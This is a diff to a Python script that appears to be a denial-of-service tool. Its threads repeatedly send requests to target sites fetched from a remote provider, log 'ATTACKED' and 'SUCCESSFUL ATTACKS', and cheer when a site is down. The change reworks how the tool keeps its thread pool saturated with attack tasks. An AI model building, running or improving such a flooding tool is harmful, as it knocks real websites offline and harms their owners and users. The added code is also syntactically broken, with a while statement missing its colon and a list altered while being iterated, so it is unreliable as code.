@@ -40,7 +40,9 @@ proxy_view = args.proxy_view
 
 remoteProvider = RemoteProvider(args.targets)
 threads = int(args.threads)
-executor_main = ThreadPoolExecutor(max_workers=threads * 2)
+
+submitted_tasks = []
+executor = ThreadPoolExecutor()
 
 last_observed_total_attacks_count = 0
 total_attacks_count = 0
@@ -106,14 +108,10 @@ def mainth(site: str):
                 logger.info(f"ATTACKED {site}; attack count: {count_attacks_for_current_site}; RESPONSE CODE: {response.status_code}")
         if count_attacks_for_current_site > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(count_attacks_for_current_site))
-        executor_main.submit(mainth, choice(remoteProvider.get_target_sites()))
     except ConnectionError as exc:
         logger.success(f"{site} is down! =^_^=")
-        # when thread is about to finish, just re-start its task
-        executor_main.submit(mainth, choice(remoteProvider.get_target_sites()))
     except Exception as exc:
         logger.warning(f"Error: {exc}; number of successful attacks: {count_attacks_for_current_site}")
-        executor_main.submit(mainth, choice(remoteProvider.get_target_sites()))
 
 def clear():
     if platform.system() == "Linux":
@@ -130,6 +128,16 @@ def cleaner():
             clear()
         collect()
 
+def runningTasksCount():
+    r = 0
+    for task in submitted_tasks:
+        if task.running():
+            r += 1
+        if task.done():
+            submitted_tasks.remove(task)
+        if task.cancelled():
+            submitted_tasks.remove(task)
+    return r
 
 if __name__ == '__main__':
     if not no_clear:
@@ -139,11 +147,11 @@ if __name__ == '__main__':
     sites = remoteProvider.get_target_sites()
     # initially start as many tasks as configured threads
     for _ in range(threads):
-        executor_main.submit(mainth, choice(remoteProvider.get_target_sites()))
+        submitted_tasks.append(executor.submit(mainth, choice(remoteProvider.get_target_sites())))
     while True:
-        sleep(10)
-        current_attacks_count = total_attacks_count
-        delta_attacks_count = current_attacks_count - last_observed_total_attacks_count
-        logger.info(f"Performed a total of {delta_attacks_count} attacks in 10 seconds")
-        last_observed_total_attacks_count = current_attacks_count
+        currentRunningCount = runningTasksCount()
+        while (currentRunningCount < threads)
+            submitted_tasks.append(executor.submit(mainth, choice(remoteProvider.get_target_sites())))
+            currentRunningCount += 1
+        sleep(2)
 
